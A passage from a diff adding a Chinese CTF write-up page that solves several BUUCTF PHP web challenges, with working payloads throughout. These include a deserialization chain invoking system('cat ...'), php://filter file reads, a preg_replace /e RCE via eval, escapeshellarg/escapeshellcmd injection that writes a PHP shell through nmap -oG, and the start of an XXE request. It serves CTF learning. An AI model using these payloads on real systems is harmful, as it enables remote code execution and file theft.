+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://ce0c0619-ce1e-420f-8e2e-5d6f9ab67e24.node5.buuoj.cn:81</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://ce0c0619-ce1e-420f-8e2e-5d6f9ab67e24.node5.buuoj.cn:81/index.php</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>func=1&amp;p=1
+</span></span></code></pre></div><p>可以发现是传入函数和参数来进行利用，尝试eval等函数发现不行，尝试file_get_contents来读取文件内容，但不知道flag在哪个地方，所以先读取目前文件内容</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$disable_fun <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;exec&#34;</span>, <span style="color:#e6db74">&#34;shell_exec&#34;</span>, <span style="color:#e6db74">&#34;system&#34;</span>, <span style="color:#e6db74">&#34;passthru&#34;</span>, <span style="color:#e6db74">&#34;proc_open&#34;</span>, <span style="color:#e6db74">&#34;show_source&#34;</span>, <span style="color:#e6db74">&#34;phpinfo&#34;</span>, <span style="color:#e6db74">&#34;popen&#34;</span>, <span style="color:#e6db74">&#34;dl&#34;</span>, <span style="color:#e6db74">&#34;eval&#34;</span>, <span style="color:#e6db74">&#34;proc_terminate&#34;</span>, <span style="color:#e6db74">&#34;touch&#34;</span>, <span style="color:#e6db74">&#34;escapeshellcmd&#34;</span>, <span style="color:#e6db74">&#34;escapeshellarg&#34;</span>, <span style="color:#e6db74">&#34;assert&#34;</span>, <span style="color:#e6db74">&#34;substr_replace&#34;</span>, <span style="color:#e6db74">&#34;call_user_func_array&#34;</span>, <span style="color:#e6db74">&#34;call_user_func&#34;</span>, <span style="color:#e6db74">&#34;array_filter&#34;</span>, <span style="color:#e6db74">&#34;array_walk&#34;</span>,  <span style="color:#e6db74">&#34;array_map&#34;</span>, <span style="color:#e6db74">&#34;registregister_shutdown_function&#34;</span>, <span style="color:#e6db74">&#34;register_tick_function&#34;</span>, <span style="color:#e6db74">&#34;filter_var&#34;</span>, <span style="color:#e6db74">&#34;filter_var_array&#34;</span>, <span style="color:#e6db74">&#34;uasort&#34;</span>, <span style="color:#e6db74">&#34;uksort&#34;</span>, <span style="color:#e6db74">&#34;array_reduce&#34;</span>, <span style="color:#e6db74">&#34;array_walk&#34;</span>, <span style="color:#e6db74">&#34;array_walk_recursive&#34;</span>, <span style="color:#e6db74">&#34;pcntl_exec&#34;</span>, <span style="color:#e6db74">&#34;fopen&#34;</span>, <span style="color:#e6db74">&#34;fwrite&#34;</span>, <span style="color:#e6db74">&#34;file_put_contents&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">gettime</span>($func, $p)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    $result <span style="color:#f92672">=</span> <span style="color:#a6e22e">call_user_func</span>($func, $p);
+</span></span><span style="display:flex;"><span>    $a <span style="color:#f92672">=</span> <span style="color:#a6e22e">gettype</span>($result);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($a <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;string&#34;</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $result;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Test</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> $p <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Y-m-d h:i:s a&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> $func <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;date&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> __destruct()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">func</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">gettime</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">func</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">p</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$func <span style="color:#f92672">=</span> $_REQUEST[<span style="color:#e6db74">&#34;func&#34;</span>];
+</span></span><span style="display:flex;"><span>$p <span style="color:#f92672">=</span> $_REQUEST[<span style="color:#e6db74">&#34;p&#34;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($func <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>    $func <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtolower</span>($func);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">in_array</span>($func, $disable_fun)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">gettime</span>($func, $p);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Hacker...&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>可以看到过滤了很多函数，观察到有Test类，可以尝试反序列化利用，并且没有过滤unserialize函数，直接构造POP链来查找flag所在位置并读取内容</p>
+<pre tabindex="0"><code>O:4:&#34;Test&#34;:2:{s:1:&#34;p&#34;;s:22:&#34;cat /tmp/flagoefiu4r93&#34;;s:4:&#34;func&#34;;s:6:&#34;system&#34;;}
+</code></pre><h2 id="bsidescf-2020had-a-bad-day">[BSidesCF 2020]Had a bad day</h2>
+<p>php伪协议读文件，必须要base64编码才能回显</p>
+<pre tabindex="0"><code>php://filter/read=convert.base64-encode/resource=index.php
+</code></pre><p>先看index，发现有过滤</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$file <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;category&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($file)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>($file, <span style="color:#e6db74">&#34;woofers&#34;</span>) <span style="color:#f92672">!==</span>  <span style="color:#66d9ef">false</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">strpos</span>($file, <span style="color:#e6db74">&#34;meowers&#34;</span>) <span style="color:#f92672">!==</span>  <span style="color:#66d9ef">false</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">strpos</span>($file, <span style="color:#e6db74">&#34;index&#34;</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">include</span>($file <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;.php&#39;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Sorry, we currently only support woofers and meowers.&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>payload必须要带有woofers、meowers、index才可以被包含，所以使用如下payload</p>
+<pre tabindex="0"><code>php://filter/read=convert.base64-encode/write=woofers/resource=flag
+</code></pre><h2 id="bjdctf2020zjctf不过如此">[BJDCTF2020]ZJCTF，不过如此</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span> <span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>$text <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;text&#34;</span>];
+</span></span><span style="display:flex;"><span>$file <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;file&#34;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($text)<span style="color:#f92672">&amp;&amp;</span>(<span style="color:#a6e22e">file_get_contents</span>($text,<span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">===</span><span style="color:#e6db74">&#34;I have a dream&#34;</span>)){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;br&gt;&lt;h1&gt;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">file_get_contents</span>($text,<span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&lt;/h1&gt;&lt;/br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/flag/&#34;</span>,$file)){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Not now!&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">include</span>($file);  <span style="color:#75715e">//next.php
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>利用php://input或者php://data来向文件写入内容，再利用php://filter来读取文件内容</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /?text=php://input&amp;file=php://filter/read=convert.base64-encode/resource=next.php <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">b3ec03ec-6e5d-451f-b4f4-44bde10654ee.node5.buuoj.cn:81</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">max-age=0</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">14</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>I have a dream
+</span></span></code></pre></div><p>得到内容</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$id <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;id&#39;</span>];
+</span></span><span style="display:flex;"><span>$_SESSION[<span style="color:#e6db74">&#39;id&#39;</span>] <span style="color:#f92672">=</span> $id;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">complex</span>($re, $str)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">preg_replace</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;/(&#39;</span> <span style="color:#f92672">.</span> $re <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;)/ei&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;strtolower(&#34;\\1&#34;)&#39;</span>,
+</span></span><span style="display:flex;"><span>        $str
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span> ($_GET <span style="color:#66d9ef">as</span> $re <span style="color:#f92672">=&gt;</span> $str) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">complex</span>($re, $str) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getFlag</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">@</span><span style="color:#66d9ef">eval</span>($_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>观察到preg_replace函数中使用了/e，并且php版本为PHP/5.6.40，存在RCE漏洞</p>
+<pre tabindex="0"><code>/next.php?\.*=${getflag()}&amp;cmd=system(&#39;cat+/flag&#39;);
+/next.php?\S*=${getflag()}&amp;cmd=system(&#39;cat+/flag&#39;);
+</code></pre><p>因为在GET传参时<code>.</code>会变成<code>_</code>所以需要使用第二个payload</p>
+<h2 id="buuctf-2018online-tool">[BUUCTF 2018]Online Tool</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_SERVER[<span style="color:#e6db74">&#39;HTTP_X_FORWARDED_FOR&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    $_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>] <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;HTTP_X_FORWARDED_FOR&#39;</span>];
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;host&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    $host <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;host&#39;</span>];
+</span></span><span style="display:flex;"><span>    $host <span style="color:#f92672">=</span> <span style="color:#a6e22e">escapeshellarg</span>($host);
+</span></span><span style="display:flex;"><span>    $host <span style="color:#f92672">=</span> <span style="color:#a6e22e">escapeshellarg</span>($host);
+</span></span><span style="display:flex;"><span>    $sandbox <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>(<span style="color:#e6db74">&#34;glzjin&#34;</span> <span style="color:#f92672">.</span> $_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;you are in sandbox &#39;</span> <span style="color:#f92672">.</span> $sandbox;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">@</span><span style="color:#a6e22e">mkdir</span>($sandbox);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">chdir</span>($sandbox);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;nmap -T5 -sT -Pn --host-timeout 2 -F &#34;</span> <span style="color:#f92672">.</span> $host);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>HTTP_X_FORWARDED_FOR</code>就是<code>X_FORWARDED_FOR</code>头，<code>REMOTE_ADDR</code>就是客户端IP，从题目来看，无所谓</p>
+<p><code>escapeshellarg()</code>把字符串转义成shell命令参数，把字符串中的单引号变成转义的单引号，并把这个转义后的单引号用两个单引号引起来。如</p>
+<pre tabindex="0"><code>&#39; &lt;?php echo `pwd` ?&gt; -oG 1.php &#39;
+&#39;&#39;\&#39;&#39; &lt;?php echo `pwd` ?&gt; -oG 1.php &#39;\&#39;&#39;&#39;
+</code></pre><pre tabindex="0"><code>escapeshellarg — Escape a string to be used as a shell argument
+
+escapeshellarg() adds single quotes around a string and quotes/escapes any existing single quotes allowing you to pass a string directly to a shell function and having it be treated as a single safe argument. This function should be used to escape individual arguments to shell functions coming from user input. The shell functions include exec(), system() and the backtick operator.
+
+On Windows, escapeshellarg() instead replaces percent signs, exclamation marks (delayed variable substitution) and double quotes with spaces and adds double quotes around the string. Furthermore, each streak of consecutive backslashes (\) is escaped by one additional backslash.
+</code></pre><p><code>escapeshellarg()</code>转义所有元字符，单纯的转义，不加单引号，如</p>
+<pre tabindex="0"><code>&#39; &lt;?php echo `pwd` ?&gt; -oG 1.php &#39;
+&#39;&#39;\&#39;&#39; &lt;?php echo `pwd` ?&gt; -oG 1.php &#39;\&#39;&#39;&#39;
+&#39;&#39;\\&#39;&#39; \&lt;\?php echo \`pwd\` \?\&gt; -oG 1.php &#39;\\&#39;&#39;&#39;
+</code></pre><pre tabindex="0"><code>escapeshellcmd — Escape shell metacharacters
+
+escapeshellcmd() escapes any characters in a string that might be used to trick a shell command into executing arbitrary commands. This function should be used to make sure that any data coming from user input is escaped before this data is passed to the exec() or system() functions, or to the backtick operator.
+
+Following characters are preceded by a backslash: &amp;#;`|*?~&lt;&gt;^()[]{}$\, \x0A and \xFF. &#39; and &#34; are escaped only if they are not paired. On Windows, all these characters plus % and ! are preceded by a caret (^).
+</code></pre><p>可以看到经过这两个函数的共同作用后，中间的命令逃逸了出来，所以我们可以尝试利用</p>
+<p>观察到给定的命令为<code>echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot; . $host);</code>，了解到nmap有一个-oG参数可以把扫描内容输出到文件中，而我们可以让恶意命令逃逸出来，所以我们可以输出为任意格式的文件，同时逃逸出对应格式文件的恶意代码，从而拿到shell</p>
+<h2 id="gxyctf2019禁止套娃">[GXYCTF2019]禁止套娃</h2>
+<p>啥也没有，扫一下目录，发现.git泄露，githack下载下来</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#34;flag.php&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;flag在哪里呢&lt;br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;exp&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#39;</span>, $_GET[<span style="color:#e6db74">&#39;exp&#39;</span>])) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#e6db74">&#39;;&#39;</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/[a-z,_]+\((?R)?\)/&#39;</span>, <span style="color:#66d9ef">NULL</span>, $_GET[<span style="color:#e6db74">&#39;exp&#39;</span>])) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/et|na|info|dec|bin|hex|oct|pi|log/i&#39;</span>, $_GET[<span style="color:#e6db74">&#39;exp&#39;</span>])) {
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">// echo $_GET[&#39;exp&#39;];
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#f92672">@</span><span style="color:#66d9ef">eval</span>($_GET[<span style="color:#e6db74">&#39;exp&#39;</span>]);
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;还差一点哦！&#34;</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;再好好想想！&#34;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;还想读flag 臭弟弟&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// highlight_file(__FILE__);
+</span></span></span></code></pre></div><p>无参数RCE，过滤的比较少，var_dump一下，但var_dump必须要参数，所以构造出一个<code>.</code>，localeconv()第一个返回的就是<code>.</code>，所以使用current()把第一个内容取出来，在用scandir()获取一下目录内容</p>
+<pre tabindex="0"><code>/?exp=var_dump(scandir(current(localeconv())));
+</code></pre><p>发现flag.php，使用readfile()读取</p>
+<pre tabindex="0"><code>/?exp=readfile(next(array_reverse(scandir(current(localeconv())))));
+</code></pre><p>具体payload看数组内容排列</p>
+<h2 id="nctf2019fake-xml-cookbook">[NCTF2019]Fake XML cookbook</h2>
+<p>XXE(XML External Entity)</p>
+<p>可以利用外部实体进行注入，报文格式为：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /doLogin.php <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">11181808-55fd-42bc-80b1-cca8d5001dbb.node5.buuoj.cn:81</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/xml, text/xml, */*; q=0.01</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/xml;charset=utf-8</span>
+</span></span><span style="display:flex;"><span>X-Requested-With<span style="color:#f92672">:</span> <span style="color:#ae81ff">XMLHttpRequest</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">57</span>
+</span></span><span style="display:flex;"><span>Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://11181808-55fd-42bc-80b1-cca8d5001dbb.node5.buuoj.cn:81</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://11181808-55fd-42bc-80b1-cca8d5001dbb.node5.buuoj.cn:81/</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;user&gt;&lt;username&gt;</span>1<span style="color:#f92672">&lt;/username&gt;&lt;password&gt;</span>1<span style="color:#f92672">&lt;/password&gt;&lt;/user&gt;</span>
+</span></span></code></pre></div><p>我们可以对发送的XML类型数据进行修改，注入外部实体，同时在返回的用户名和密码数据中把恶意操作回显出来</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /doLogin.php <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">11181808-55fd-42bc-80b1-cca8d5001dbb.node5.buuoj.cn:81</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/xml, text/xml, */*; q=0.01</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/xml;charset=utf-8</span>
+</span></span><span style="display:flex;"><span>X-Requested-With<span style="color:#f92672">:</span> <span style="color:#ae81ff">XMLHttpRequest</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">145</span>
+</span></span><span style="display:flex;"><span>Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://11181808-55fd-42bc-80b1-cca8d5001dbb.node5.buuoj.cn:81</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://11181808-55fd-42bc-80b1-cca8d5001dbb.node5.buuoj.cn:81/</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE test [
